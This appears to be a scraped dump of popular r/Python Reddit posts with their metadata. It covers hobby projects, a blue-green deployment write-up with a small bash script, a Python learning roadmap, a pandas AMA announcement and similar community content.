TLDW: When I want to **automate actions on a site**, such as logins or forms, or scraping pages with JavaScript, **I manually** inspect each web element I need and begin writing a script.

***I'm lazy though*** and had the idea to automate the creation of these automation/testing scripts. And thus ""Sillynium"" was born.

Sillynium allows you to **draw boxes around the elements you require** on a page and automatically gets the element and its properties for you. Different coloured rectangles tell the program you want to do different things. Eg: Red means ""Input text"", Green means ""Click button"".

**When you've finished drawing boxes, a working python selenium script is generated**. If you run that script, it does exactly what you told it to do! All this without you writing any code, and losing time.

**Working 60 second video link of program in action**: [https://streamable.com/1y17lt](https://streamable.com/1y17lt)

I made this project over the course of a day as a quick and dirty proof of concept. Its very flawed in its current iteration (taking a screenshot of webpage), so V2 I'm trying to figure out how to draw directly to the browser. Critique it and rip it to shreds. I'm aware of browser recorders btw so I know those exist, this is my twist on automation

**Edit**: I was not prepared for the amount of interest in this little proof of concept! So thank you all very much for your time you’ve made my day :)

In the interest of transparency and to answer your questions about the code and my plans:

I originally thought about monetisation (web extension etc) after finishing this POC (\*\*sigh i know I’m a greedy bastard) but now I’m in 2 minds about it!

On the one hand I want to make it free for personal use, on the other hand I’d like to potentially charge for commercial use (once its finished).

*Final edit 2* The community has spoken, I WILL BE RELEASING THIS VERSION AS OPEN SOURCE! I did some light refactoring, and have added it to a repo which will be shared in a follow up. It shows the POC and the community is welcome to build on the original idea :) 

I will create a follow up post with links to repo once I’ve created it, this will be my first project on GitHub so try be nice ;) pretty nervous about sharing my code :D

Thank you all for your patience, interest, and awesome discussions",https://www.reddit.com/r/Python/comments/k2kbs4/sillynium_auto_generate_working_python_selenium/,174,1500
c7a5lq,A terminal youtube playlist music player - because terminal applications are minimal and running a web browser is an overkill to listen to music,,https://i.redd.it/yqkfcr3mwf731.png,150,1500
vfsakl,"Today I’m releasing PyBoy v1.5.0! A Game Boy emulator written in Python, focused on scripting, AI and learning","Back in 2015, it started as a university project. About 2 years ago, I [released v1.0.0 to the public](https://www.reddit.com/r/Python/comments/g484d4/today_im_releasing_pyboy_v100_a_game_boy_emulator/), and it really took off! We ended up trending on GitHub and got [picked up by Hackaday](https://hackaday.com/2020/04/26/snakes-and-ladders-game-boy-emulator-in-python/)!

It's been awesome to see people using the emulator for various projects, like [beating the world record in Tetris](https://towardsdatascience.com/beating-the-world-record-in-tetris-gb-with-genetics-algorithm-6c0b2f5ace9b), Discord and Twitch bots, and [something entirely unique](https://hackaday.com/2021/09/21/interactive-clips-for-game-boy-sit-back-and-watch-or-take-control/).

Since the first release, I've had the privilege that three groups of students at the University of Copenhagen have helped me work on the project. They've implemented a feature to rewind time, emulate Link Cables (not merged on master), and most recently Game Boy Color support.

[https://github.com/Baekalfen/PyBoy](https://github.com/Baekalfen/PyBoy)

&#x200B;

[Game Boy Color Support!](https://i.redd.it/v0oq7bnzxj691.gif)

&#x200B;

[Mario controlled by an AI](https://i.redd.it/6l3u1wq5yj691.gif)

**What is PyBoy**

In short, it’s a Game Boy emulator written from scratch in pure Python, with additional support for scripting through an API. We’ve added type definitions, which allows us to compile the software using Cython to get performance comparable to emulators written in C and C++.

**Installation**

The instructions are simple, if you already have a functioning Python environment on your machine.

1. Install PyBoy using pip install pyboy
2. If your system isn't supported by pysdl2-dll, you'll need to install SDL2 from your package manager.

**Features**

PyBoy is designed to be accessible from Python, so we support and encourage people who want to make experiments, bots or AI’s to try it out. We are building game-specific wrappers, which at the moment allows programmers to interface with Tetris and Super Mario Land, without any intricate knowledge of the Game Boy. Documentation can be found at: [https://docs.pyboy.dk](https://docs.pyboy.dk) .

**Feedback, Contribute, Learn**

We’d love to hear your feedback, and see the projects you wish to use PyBoy for! We will do our best to make it happen.

Please give any feedback in the comments below, on our Discord server or create issues/pull-requests on GitHub if you wish.

And a special thanks to the people on Discord, who were a great motivational factor in all of this (in no specific order): krs013, jan0809, Lyfe, kr1tzy, Nico, MLGxPwnentz, mr\_seeker, Sky, Travis Scott Burger, Whippersnatch Pumpkinpatch, AutoMathis",https://www.reddit.com/r/Python/comments/vfsakl/today_im_releasing_pyboy_v150_a_game_boy_emulator/,32,1498
9xbq05,Flask app to extract palette of dominating colors from image,,https://i.redd.it/h4yzvy8w8iy11.png,88,1493
cpmll6,Made a racing game that runs in Terminal. 100% Python,,https://i.redd.it/li1r9j4nl4g31.gif,63,1496
9xxuus,Python in the new NASA going to the Moon video.,,https://i.imgur.com/GxrMHQl.jpg,241,1488
cghqy0,For those of you made uncomfortable by yesterdays simulation. No phones were harmed in the making of this simulation,,https://v.redd.it/em76zkj2pwb31,69,1485
feg8ua,Prof. Gilbert Strang a mathematician and professor at MIT mentioning Python while teaching a course on Computational Science and Engineering in Fall 2008,,https://i.redd.it/5xr7emroz2l41.jpg,113,1485
ctdgk8,I created a python script that can (technically) play videos inside of the terminal!,,https://v.redd.it/1322zrdb8rh31,80,1485
grwueh,2D Raycasting along with Rendered view - Visualization was done using Pygame! People who love games would definitely love this! Link to the Github repository in the comments!,,https://v.redd.it/gm4m2d4qse151,52,1481
ozr7s7,Wrote this program to skip Spotify Ads using Spotify API,"No one likes interruptions! right? So i wrote this program that detects when an advertisement plays by monitoring the type of the track that is currently playing, using the Spotipy API. When an ad is detected, the program restarts Spotify by the os module and plays it via pynput, which skips the ad and starts right where you left off. Its kinda cool and i am proud of it.

Here is the repo- [https://github.com/daspartho/SpotiByeAds](https://github.com/daspartho/SpotiByeAds)

I would love to get some thoughts and feedback on the project.",https://www.reddit.com/r/Python/comments/ozr7s7/wrote_this_program_to_skip_spotify_ads_using/,164,1478
xobba8,How I deploy my bootstrapped Python webapp with 150k monthly users,"I am a one-man show building a web-based software product. Some quick facts about my app:

* Written in Python Flask
* 150k visitors per month
* 15k registered users
* 3k US$ revenue per month
* 70 requests per second at peak-time

This is a technical post looking at the infrastructure that runs my app with a focus on how I deploy it.

## Summary

* I use 2 VPS (virtual private servers) running on DigitalOcean
* The database is Postgres and is fully managed by DigitalOcean
* I use a blue-green deployment
* Deployment is done via `git` and `ssh`.
* No CI/CD
* No containers
* Absolutely no Kubernetes

I am a strong advocate of using ""boring technology"". I am also the only developer of the app, which makes many things simpler.

## The application infrastructure

The app is a CRUD monolith that is deployed as one artefact. I use nginx and gunicorn to serve the app.

The app runs on 2 virtual private servers, one of which is the production server, the other of which is the staging server. During deployment, they switch roles. This is a so-called *blue-green deployment*, more on that later.

I'm using a DigitalOcean droplet with 8 shared CPUs, 16GB of memory and 80 GB of storage for each server.  They both run Ubuntu which I have to administrate.

There is a single Postgres database, which is always in production. It is fully managed by DigitalOcean, which means I have to do no house-keeping. Currently, it has 4 shared CPUs, 8 GB of memory and 115 GB of storage.

Overall, the setup is absolutely rock solid. Also, all my technology is older than 10 years (OK, not 100% sure about this, but probably true).

## Why I chose blue-green deployment

Before I switched, my deployments worked as follows:

* There was one app server running on DigitalOcean, plus the hosted Postgres database.
* To deploy, I used a script that SSHed into that server and did a `git pull`

This was fine to begin with, however there were several issues:

1. My setup compiles and minifies CSS and Javascript on the server.  This resulted in up to 10 seconds for the server to respond after a deployment. Some users ran into `Bad Gateway` errors 💥.
2. A bug in production could be fixed by checking out the previous commit. However, this invariably took too long and always involved frenzied googling of the correct git commands.
3. There was no way of testing the production setup, other than in production.

&#x200B;

## What is blue-green deployment?

Here's how I would explain blue-green deployment:

1. There are two identical and independent servers hosting the application. One is called ""green"", the other ""blue"".
2. There is a shared production database that both servers can access.
3. There is a quick and painless way of routing traffic to the green or the blue server.

One of the 2 servers is serving production traffic (the live server), the other is idle. When a new release is ready, it gets deployed to the idle server. Here it can be tested and issues fixed. Remember, the idle server is still accessing the production database, so the application can be tested with real data.

Once you're satisfied that you're ready, you switch traffic from the live server to the idle server. If any problems occur, you can simply switch back within seconds, effectively doing a roll-back.

Simple, no?

## How I do blue-green deployment

I've already mentioned my 2 application servers. But the magic  thing that makes it all possible is a  [floating IP address from DigitalOcean](https://www.digitalocean.com/docs/networking/floating-ips/).

This is a publicly-accessible static IP addresses that you can assign to a server and instantly remap between other servers in the same datacenter. My app domain (keepthescore.com) resolves to this static IP address. Internally, however, the IP is pointing to either the green or the blue server.

Both of my servers expose their hostname via a publicly accessible route: [https://keepthescore.com/hostname/](https://keepthescore.com/hostname/). Give it a try by clicking on the link!

So now it's possible for a human or a machine (using `curl`) to discover which the current live server is (blue or green).

The deployment script can use this information to always automatically deploy to the **idle** server. Here's my (simplified) BASH deployment script:

    # Get the current production server and 
    # set TARGET to the other server 
    CURRENT=$(curl -s https://keepthescore.com/hostname)
    if [ ""$CURRENT"" = ""blue-production"" ]; then
      TARGET=""green.keepthescore.com""
    else 
      TARGET=""blue.keepthescore.com""
    
    echo ""Current deployment is "" $CURRENT
    echo ""Deploying to "" $TARGET
    
    # Do deployment
    ssh -q root@$TARGET ""git pull""
    echo ""Deploy to "" $TARGET "" complete""

After I've run the script I can test the deployment on my laptop by simply pointing my browser to `blue.keepthescore.com` or `green.keepthescore.com`. Once I'm sure that everything's working I route traffic to the newly deployed idle server using DigitalOceans's web interface. (I could do this via script too, but haven't got round to it yet).

Result: My users get routed to the newly deployed software without noticing (hopefully).

Voilá! ✨

## What about continuous integration / continuous deployment?

I have no CI/CD pipeline. I do have a bunch of integration tests, but I run them manually. I will eventually get round to setting up some kind of automated testing, but so far there's been no need.

Just to be clear: when I run my integration tests, they happen on my laptop and use a test instance of the database. It's only when I do manual high-level testing on the idle staging server that the production database is used.

## What about the database?

There is only one database instance, so you might think this could be a problem. Martin Fowler, who wrote a [great article about blue-green deployments](https://martinfowler.com/bliki/BlueGreenDeployment.html) says the following:

>Databases can often be a challenge with this technique, particularly when you need to change the schema to support a new version of the software. The trick is to separate the deployment of schema changes from application upgrades. So first apply a database refactoring to change the schema to support both the new and old version of the application, deploy that, check everything is working fine so you have a rollback point, then deploy the new version of the application. (And when the upgrade has bedded down remove the database support for the old version.)""

I've been using this method so far. In fact, I have never done an automated schema migration of my database. It's worked great so far, so why do it differently?

## That's all

Thanks for reading my article! You can follow my journey as a bootstrapped one-man startup [on Twitter](https://twitter.com/wrede). See you in the next post!

One more thing: if you want to share this post, please consider using this [link](https://casparwre.de/blog/webapp-python-deployment/) (which points to my blog)",https://www.reddit.com/r/Python/comments/xobba8/how_i_deploy_my_bootstrapped_python_webapp_with/,169,1484
dij6wi,"My previous post on the algorithm i made to create these images blew up, so here is another! WITH a Github link: https://github.com/TyperOfCode/image_algorithm",,https://i.redd.it/vxh1wfkpkts31.png,36,1478
bc2606,Just Found the Best Python Book...Cover,,https://i.redd.it/rfyhgyfpwnr21.jpg,82,1478
nlavn7,Python is now the second most popular language in the world according to TIOBE. This is the highest position that Python reaches since 2001.,,https://www.tiobe.com/tiobe-index/,188,1479
hd0ueq,Here's a very simple Python wallpaper,,https://i.redd.it/szncuech07651.png,48,1471
i2rofw,I Made Snakes With Neural Networks! Here were the four best ones.,,https://v.redd.it/vzkkak698qe51,58,1474
z3gntf,Detailed Python developer roadmap,"Hello! My name is Mikhail Emelyanov, I am embedded software engineer, and I was inspired to write this little roadmap on the capabilities of Python language by a certain commonality among the existing Python tutorials found on the web.

The usual suggestions to study, say, “Algorithms and Data Structures” or “Databases” are especially jarring. You can spend years studying these topics, and even after decades you'd still be able to find something you didn't know yet even without ever venturing outside the scope of Algorithms!

Using video game analogies, we can say that novice programmers often stand on the shore of the lake of boiling lava with an island with the ever-coveted jobs in the center, while the islands in between, which you have to jump on, gradually increasing your skills in successive mini-quests, are either missing, or arranged haphazardly, or their fairly smooth sequence breaks off, never having managed to get you any farther from the shore. Let's try to build a path of hint islands, a number of which, although not without effort, will finally allow us to reach our goal.

The roadmap is very easy to use. Just as you would in a normal text, go from left to right and from top to bottom. If you're just starting to learn Python, follow the green sections of the roadmap. If your accumulated experience, curiosity, or necessity pushes you deeper, start exploring the sections marked in gray. Orange marks the topics that require in-depth study, those are better to tackle (at least without digging especially deep to begin with) on the third pass.

This article definitely contains mistakes and inaccuracies of different calibers, and of course, many required subsections are missing; so, if you notice any of these, feel free to comment, and if you feel the Force, you're welcome to fork the [GitHub repository](https://github.com/amaargiru/pyroad) with the roadmap's source code and contribute whatever you feel is necessary; all corrections and additions are strongly encouraged. It also contains all the parts of the map in [Mermaid](https://github.blog/2022-02-14-include-diagrams-markdown-files-mermaid/) diagram format, as well as png/svg illustrations.

When diving into Python, don't forget the excellent official documentation at [docs.python.org](https://docs.python.org/). By studying it, at least in brief, and gradually reading deeper into the right sections, you will be able to see that many of the “hacks”, “findings” and other obscure matters have long since been considered, described and have detailed examples of use.

I would also recommend [leetcode.com](https://leetcode.com/problemset/all/?difficulty=EASY&page=1&status=NOT_STARTED) for learning basic Python syntax to the fullest extent. If you filter the tasks by “Easy” level, and then add an additional sorting by the “Acceptance” column, you'll be presented with a straightforward primer with smoothly increasing task difficulty, rather than the intimidating competitive platform.

Well, that’s enough stalling for the moment. Let's get started!

## Data Structures

https://preview.redd.it/lkulkxu3lv1a1.png?width=1636&format=png&auto=webp&s=a4015c2a3758026e19166731ffaa82dae843f24f

As a reminder, if you are a novice developer, go from left to right through the entries marked in green. Create instances of each type, try adding and removing elements, and experiment with them via the debugger. See how big the resulting objects are, and try to figure out why list and array containing the same data are different in size. Study the features of each type, read and figure out which data structure will work best for which tasks.

Don't forget that this is just a guide, a table of contents for a book that you will have to write yourself. Actively seek information on the web, consult sources and official documentation. Dive [Stackoverflow](https://stackoverflow.com/) just for fun, there's plenty of exciting reading there!

If you start to make progress, move on to the next section, and don't feel bad if you can't. Don't envision your mind as the sword of Alexander the Great cutting the Gordian knot in one fluid, precise move, worthy of Instagram's front page. Be as a carpenter’s plane, stripping away one thin layer at a time, and sooner or later the misunderstanding will go away, even if this seems to you to be a chasm ten thousand leagues deep.

## Data Management

https://preview.redd.it/3abaud65lv1a1.png?width=1885&format=png&auto=webp&s=01e490d208a44537c14a8e56c757c0ddf983f1a1

Try to manipulate your data, feel how you can mold anything you want out of this malleable clay. Try creating a data structure with many elements (a million, for example), sort them, quickly find the values you want with bisect, and write the results in a JSON file.

If everything goes according to plan, try to dig into the less obvious topics: apply regex to solve some simple task or save previously obtained data in Pickle format, understanding the reason for binary file formats after observing the size of the resulting files.

This is where you will find the first entries marked in orange. Google what TensorFlow and Keras are and what tasks they solve. Perhaps, this could be your future job, your vocation!

## Data Flows

https://preview.redd.it/c6d70lf6lv1a1.png?width=1841&format=png&auto=webp&s=d1e36177e411db0cc037e255087999af0af3cc5e

Add more specific capabilities to your data management skills. All of the topics covered are essential in the practical programming process and are present in all modern languages in one form or another. That way, if you eventually switch from Python to Java, C# or C++, the knowledge you've acquired won't become dead weight.

## Object-Oriented Programming

https://preview.redd.it/hv5hj3t7lv1a1.png?width=1408&format=png&auto=webp&s=50c9802a69a2d2280ed998c37cad6d52a3869718

Dive into the subject of object-oriented programming. Understand that objects are your friends, and all their features and properties, even if they are not quite intuitive at first glance, have purely utilitarian reasons for existing.

OOP makes it much easier to partition, develop and maintain code, not just making very complex tasks feasible for average programmers, but making the world around us more manageable, predictable and generally better.

## Language Skeleton

https://preview.redd.it/mr6778x8lv1a1.png?width=1240&format=png&auto=webp&s=14ed84bf992c1f376917687558ecec359abac22d

Perfect, a bit deeper now. Studying how GIL or GC works will give you an understanding of why things go awry in one case or another, not at all the way you planned. You are likely to use exceptions all the time, given that they can occur in some operations with data structures, so study them further.

## Multithreading and Multiprocessing

https://preview.redd.it/vdgn2t1alv1a1.png?width=1370&format=png&auto=webp&s=8e2c1f0278e38f8180d3ba6224c00db2baf8f218

Before you dive into multithreading and multiprocessing, be sure to study their typical use cases. There may be situations in which the gain is minimal or non-existent.

Try to implement simultaneous fast data processing and waiting for user input, which changes the input data for calculations, so you understand the capabilities, pros and cons of different approaches.

Don't try to use all the features provided by Python at once, stick to the task at hand.

## Common Practices

https://preview.redd.it/uhaxz92blv1a1.png?width=1498&format=png&auto=webp&s=d229ae69d1734c11bf4763342a8db28e72029109

Description of common methods used in almost all software projects, not just in Python. I/O, profiling, and logging apply universally.

Testing in general constitutes a separate profession, and often the quality of a software product can be judged by the test coverage of the source code. For example, the code of the SQLite database is 100% [covered by tests](https://www.sqlite.org/testing.html), while one line of ""combative"" code requires 608 lines of tests.Jokes aside, projects with 100% coverage are not common, but pytest used wisely is the best guarantor of your sound sleep at night!

## Algorithms

https://preview.redd.it/nwqb1f4clv1a1.png?width=1172&format=png&auto=webp&s=1c53be6fd370a5c2080e3256fa160c28f8dc77a4

One of those areas of human knowledge that you can delve into endlessly. On the other hand, the learning curve of this discipline for covering the practical needs of the average programmer has long been known, so the initial stages shouldn't be too difficult for you. Who knows, maybe you'll enjoy it so much and drag it out that in time you might even be able to contribute a new robust argument in the discussion of “[Equality of P and NP classes](https://en.wikipedia.org/wiki/P_versus_NP_problem)”!

## Databases

https://preview.redd.it/m7o764adlv1a1.png?width=1904&format=png&auto=webp&s=af27de81ca1fc90e925ef786ac8d3e1bbecbd43c

Learn the general concepts first, and then the specifics of working with specific database management systems. Try working with SQLite, even if you're planning to switch to PostgreSQL later. SQLite is a very popular database, used in Android, Chromium and dozens of other popular projects. You can use SQLite as a convenient local storage alternative to working with files directly.

By the way, try to briefly return to chapter one, Data Structures, to understand how and why the inner workings of databases are structured.

This also provides yet another door into a ""another world"". Perhaps you would like to tie your future to databases by becoming a [DBA](https://en.wikipedia.org/wiki/Database_administrator)?

## Net

https://preview.redd.it/fb30mm5flv1a1.png?width=831&format=png&auto=webp&s=d7f0ca1388cee55cf163b7df27298e14e46202ee

Try to create a client and a server, poke some popular website or an open API. Here you might as well experiment with HTML, CSS, and even Java(Type)Script. Who knows, perhaps your choice would be to become a full-stack programmer, combining back- and frontend development.

## Architecture

https://preview.redd.it/ap04zpshlv1a1.png?width=1904&format=png&auto=webp&s=3b355ad3539bb8e3ca48071f7abace825f8af98f

Please try not to memorize architectural principles by heart; they are not Shakespeare's timeless poems. The rambling about how “Liskov's substitution principle means that if S is a subtype of T, then objects of type T in a program can be...” offers no advantage to anyone. Just try applying the same LSP to the program you are writing. What benefit would compliance with this principle give you? What problems will result from not following it? What price will you have to pay for its implementation and support?

Try messing around with the functional paradigm. Applying the functional approach and using it in practice is possible not only in Haskell or F#, but also in Python, and it doesn't have to be done only within functools.

Figure out the reasoning behind the job interviewer's request to “say the three main words” (it's not “I love you”, by the way, it’s “inheritance, encapsulation, polymorphism”) and why this triad should be supplemented with the “abstraction”.

Try to understand what specific, tangible problems of the old paradigms the developers of Agile or the popularizers of microservice architecture faced. Figure out what's wrong with main(), which calls all the other procedures, since this is common practice in embedded programming. Weigh the cost of additional layers of abstraction between the root business logic and the outside world.

## Deployment and Administration

https://preview.redd.it/7i30vl1jlv1a1.png?width=1229&format=png&auto=webp&s=11dfe2a1777ed68406dcaab3969be72faf6a534a

Despite the fact that git and especially Linux are quite complicated and extensive topics, the beginning of their learning curve isn't very steep, so I highly recommend starting your DevOps mastering with git (at least the add-commit-push part, so you at least have a revision history, flawed as it is) and Linux (PuTTY + WinSCP, for example; copy your Python scripts via SSH and run them on a remote Linux machine). Fortunately, these days good text and video tutorials covering these topics are about as rare as grains of sand on the beach. Take it from me, the Linux console that looks so strange and inconvenient at first sight will seem much more familiar once you start learning vim. Cognition comes through comparison!

Well, this is where our map ends. Try to reach the last green section, GitHub Actions; run a linter on your open source project, for example (GitHub Actions is free for open source projects).

## Overall Roadmap

The overall roadmap can be obtained by simply mechanically adding up the previous entries, just so we can see what we've ended up with. Overall [Mermaid](https://github.com/amaargiru/pyroad/blob/main/13_Full.md), [svg](https://raw.githubusercontent.com/amaargiru/pyroad/main/pics_svg/13_Full.svg), [png](https://raw.githubusercontent.com/amaargiru/pyroad/main/pics_png/13_Full.png).

https://preview.redd.it/9c58t9yjlv1a1.png?width=1904&format=png&auto=webp&s=996729b191a58143eb90697d50c35483e36c21b8

## That’s all for now

As you may have noticed, there is no mention of control constructs, IDE installation or virtualenv in this guide. In my opinion, all these topics are very important, but do not constitute the essence of the language, representing something like a binding solution, while the topics discussed in the article, from list to Kubernetes, serve as the full-fledged “bricks”.

As a reminder, all the diagrams are made in Mermaid format (you can change the picture just by correcting the text), all the sources are available on [GitHub](https://github.com/amaargiru/pyroad), correct as much as you want, or, of course, leave comments directly in the comments section.

Separately, I welcome all beginner programmers. You will come to realize that working 8 hours in a row using your head and not your hands is hard, too. But, no matter what languages you plan to code in and no matter how far you've come in this difficult task, you will definitely upgrade your brain, improve your understanding of the world around you and start to recognize secret passages where you have seen only impenetrable walls before. So it's time to start the IDE, focus a little bit, and start practicing.

And remember: “This is my Python. There are many like it, but this one is mine. My Python is my best friend. It is my life. I must master it as I must master my life.  Without me, my Python is useless. Without my Python, I am useless. My Python and I know that what counts in life is not the words we say, the lines of our code, nor the time we spend at the office. We know that it is the completed tasks that count. We will complete them... My Python is human, even as I'm human, because it is my Python. Thus, I will learn it as a brother. I will learn its weaknesses, its strength, its parts and accessories, its standard library and its infrastructure. I will keep my Python from dangerous misunderstanding or suboptimal use, even as I do my legs and arms, my eyes and heart from any harm. I will keep my Python clean and ready. We will become part of each other. So be it.”",https://www.reddit.com/r/Python/comments/z3gntf/detailed_python_developer_roadmap/,62,1462
ajdpf2,Simulated herbivores and carnivores on an island using Python,,https://v.redd.it/pjgvxwx86ec21,97,1465
ei0hjq,Today is the last day of Python 2 support!,,https://www.reddit.com/r/Python/comments/ei0hjq/today_is_the_last_day_of_python_2_support/,255,1458
62q2sm,Python Helped me Write Again,"[A letter in my own handwriting](http://imgur.com/a/W4ZIk).

I learned Python in 1998, and I used it pretty much daily through my working life. Its connectivity with everything has allowed me to do all kinds of interesting and fun things. When I discovered that the [AxiDraw](http://www.axidraw.com/) pen plotter has a [Python binding](https://github.com/inconvergent/axidraw-xy), I decided to try writing in my own handwriting with my own pen. Something I've been unable to do for years.

It has taken a lot, mostly because I can't type, so I've been limited to voice recognition and copy and paste, but the letter linked above is where I got to this evening.

I thought I would share my mini triumph.

I've learned and programmed in a lot of different languages over the years. I have written several languages myself. And even though Python wasn't my first language, it is the first language I consider for any new project. I'd have to have a compelling reason to use something else. So thank you, Python, for making this possible.

</ shameless preaching to the choir> ;)

---

Edit: In the comments a couple of people asked for a video. I will make a proper video with the AxiDraw as soon as I can. [We just did a quick test](https://youtu.be/W5YGwNlO53A) on my wife's Cricut craft cutter. It works there too, though you can't tilt the pen or change the pressure. So apologies it's not the proper plotter, but you can see how the paths are traced on this video.",https://www.reddit.com/r/Python/comments/62q2sm/python_helped_me_write_again/,85,1458
fqdnjv,I made a python script to download and save your favorite Facebook videos.,,https://i.redd.it/suixxhhwgcp41.gif,103,1451
hj0vp6,My Python regex ebook with hundreds of examples and exercises is currently free,"Hello!

I finally published my updated version of **Python regular expressions** ebook. My initial motivation was to add **epub** format and separate out **third-party regex** module content into a separate chapter. An email exchange with a reader, a look at feedback from the past year and my own improvements as a writer resulted in a significant overhaul. It took me about 6 weeks to complete the revision instead of 1-2 weeks that I estimated. Sounds familiar right? I’m definitely pleased with the changes, but along the way I added a long list of TODOs that will probably need months of work. Future me is not going to be pleased.

To get pdf/epub versions, use any of these links:

* https://gumroad.com/l/py_regex
* https://leanpub.com/py_regex

As a bundle (Python/Ruby/JS regex and grep/sed/awk cli tools):

* https://gumroad.com/l/regex
* https://leanpub.com/b/regex

I made **all my books free** at the end of March when the pandemic hit my country. The virus doesn’t seem to be going away anytime soon, so I’ll probably start charging again after I finish updating the Ruby and JS regex books. You can still pay if you wish.

You can read the entire book from the GitHub repo - https://github.com/learnbyexample/py_regular_expressions. The repo also contains the code snippets used in the book and a handy way to access all the exercises in a single file. You can also find the solutions there. 

**Edit (Aug 2020):** Web version of the book - https://learnbyexample.github.io/py_regular_expressions/ 

I’d highly appreciate your feedback. That’s been a major motivating factor to keep writing as well as for improving the content.

Happy learning :)",https://www.reddit.com/r/Python/comments/hj0vp6/my_python_regex_ebook_with_hundreds_of_examples/,109,1449
fm24jb,Made a fluid simulation for my engineering exams,,https://i.redd.it/vcvcxnwk0wn41.gif,92,1448
kvol74,Learn something new about Python every day in less than 1 minute,"I'm running a channel, where I am publishing a Python mini-tutorial every day. I thought some of you might find it useful:

https://www.youtube.com/c/PythonIn1Minute/videos

I try to keep it beginner-friendly, my goal is to teach something useful or show a neat trick or solve a common pain-point in under 60 seconds.

I am quite new to this youtube thing, so I'd love to hear your feedback. Is this kind of thing a good idea? Do you find it helpful? Any suggestions on what could be improved?

Edit: I am overwhelmed by the amount of positive and constructive feedback, you guys are awesome, thank you so much!
You gave me a lot of great ideas, and the motivation to keep creating videos.

Edit2: If you can afford it and you wish to support my work you can [buy me a coffee](https://www.buymeacoffee.com/jcsongor) or [become a patron](https://www.patreon.com/PythonIn1Minute).",https://www.reddit.com/r/Python/comments/kvol74/learn_something_new_about_python_every_day_in/,206,1448
fr1x65,"*Update* Thank you all for your suggestions on my previous post about Handwriting Synthesis Algorithm, after going through all the comments and ideas you all shared, I have made Handwriting Synthesis v2, please review and suggest any changes/add-ons.",,https://i.redd.it/c1vokq0jbkp41.png,68,1449
11fio85,"We are the developers behind pandas, currently preparing for the 2.0 release :) AMA","Hello everyone!

I'm Patrick Hoefler aka phofl and I'm one of the core team members developing and maintaining pandas ([repo](https://github.com/pandas-dev/pandas), [docs](https://pandas.pydata.org/docs/dev/index.html)), a popular data analysis library.

This AMA will be at least joined by

* [Marc Garcia](https://github.com/datapythonista) \-- maintainer
* [Marco Gorelli](https://github.com/marcogorelli), -- maintainer
* [Richard Shadrach](https://github.com/rhshadrach) \-- maintainer
* [me](https://github.com/phofl)! -- maintainer

**The official start time for the AMA will be 5:30pm UTC on March 2nd**, before then this post will exist to collect questions in advance. Since most of us live all over North America and Europe, **it's likely we'll answer questions before & after the official start time by a significant margin**.

**pandas** is a Python package that provides fast, flexible, and expressive data structures designed to make working with ""relational"" or ""labeled"" data both easy and intuitive. It aims to be the fundamental high-level building block for doing practical, **real world** data analysis in Python. Additionally, it has the broader goal of becoming **the most powerful and flexible open source data analysis / manipulation tool available in any language**.

We will soon celebrate our 2.0 release. We released the release candidate for 2.0 last week, so the actual release is expected shortly, possibly next week. Please help us in testing that everything works through [testing the rc](https://github.com/pandas-dev/pandas/releases/tag/v2.0.0rc0) :)

Ask us anything! Post your questions and upvote the ones you think are the most important and should get our replies.

\- Patrick, on behalf of the team

&#x200B;

&#x200B;

Marc:

I'm Marc Garcia (username datapythonista), pandas core developer since 2018, and current release manager of the project. I work on pandas part time paid by the funds the project gets from grants and sponsors. And I'm also consultant, advising data teams on how to work more efficiently. I sometimes write about pandas and technical topics at my [blog](https://datapythonista.me/blog/), and I speak at Python and open source conferences regularly. You can connect with me via [LinkedIn](https://www.linkedin.com/in/datapythonista/), [Twitter](https://twitter.com/datapythonista) and [Mastodon](https://fosstodon.org/@datapythonista).

Marco:

I'm Marco, one of the devs from the AMA. I work on pandas as part of my job at Quansight, and live in the UK. I'm mostly interested in time-series-related stuff

Patrick:

I'm Patrick and part of the core team of pandas. Part of my daytime job allows me to contribute to pandas, I am based in Germany. I am currently mostly working on Copy-on-Write, a new feature in pandas 2.0. (check my [blog-post](https://medium.com/towards-data-science/a-solution-for-inconsistencies-in-indexing-operations-in-pandas-b76e10719744) or our new [docs](https://pandas.pydata.org/docs/dev/user_guide/copy_on_write.html) for more information).

Richard:

I work as a Data Scientist at [84.51](https://www.8451.com/) and am a core developer of pandas. I work mostly on groupby within pandas.

\--

* [Announcement post](https://www.reddit.com/r/Python/comments/11ebuh0/join_us_for_an_ama_with_the_developers_of_pandas/)
* [full pandas team](https://pandas.pydata.org/about/team.html)
* [Marc wrote about pandas 2.0 and our Arrow support](https://datapythonista.me/blog/pandas-20-and-the-arrow-revolution-part-i)",https://www.reddit.com/r/Python/comments/11fio85/we_are_the_developers_behind_pandas_currently/,368,1448
rs2utp,A strongly typed dialect of Python is coming. I would like to humbly suggest a name for it.,"With type hints, secondary tooling like the `typing` module, and really good inspectors like Pyright already available, a strongly typed dialect of python is definitely coming. Just like the JavaScript world is heavily adopting their version of the same in TypeScript, the new dialect will likely have a new name.

Here’s the issue: the name that keeps getting floated is ‘Typed Python’. Forgive me, but that name sucks and has no character. A language invented while Clinton was President by a guy with one of the 3 coolest first names you can have, and named after a sketch comedy show deserves better than this.

Thus, I would like to propose a simpler name; one that is more ‘pythonic’ if you will. If we just exchange the positions of the “P” and the “T” we evoke the same idea (in addition to making it wonderfully Google-able) and get the name:

**Typhon**


**EDIT**: I failed to mention and have since learned that Typhon and Python both come from Greek Mythology—and both were serpant giants. Typhon battled Zeus and Python battled Apollo. Python was memorialized by having a big snake named after him. Typhon still awaits his big come up (*which is why I have gathered you all here today*). But given the natural association between them from mythology already, I really love how smoothly this all seems to go together from different angles.",https://www.reddit.com/r/Python/comments/rs2utp/a_strongly_typed_dialect_of_python_is_coming_i/,475,1449
m8l7ip,The New Switch-Case Statement in Python 3.10,,https://youtube.com/watch?v=2qJavL-VX9Y&feature=share,237,1436
cc5ch7,I wrote an integrated POS system for my girlfriend's restaurant using tkinter.,,https://imgur.com/a/RKeuCva,226,1435
dsxv07,Python passed Java as the second-most popular language on GitHub by repository contributors,,https://github.blog/2019-11-06-the-state-of-the-octoverse-2019/,160,1429
jittwt,I recently updated my pandas dataframe GUI so you can easily embed it in your own Flask apps. Here's a quick demo I made. Code linked in comments.,,https://v.redd.it/7usty7d04kv51,71,1423
ijjppe,I created a library called 'handcalcs': it renders your Python calculations in Latex as though you had written them by hand.,"Doing calculations in Jupyter is enjoyable but can require endless `print()` statements with f-strings to show your results.

With handcalcs, use the `%%render` cell magic and your Python calculation is rendered with the symbolic formula, followed by the numeric substitution, and then the result, just as though you had written it by hand.

  
Works as both a cell magic and as a decorator on your functions. For engineers, data scientists, educators, and students.  


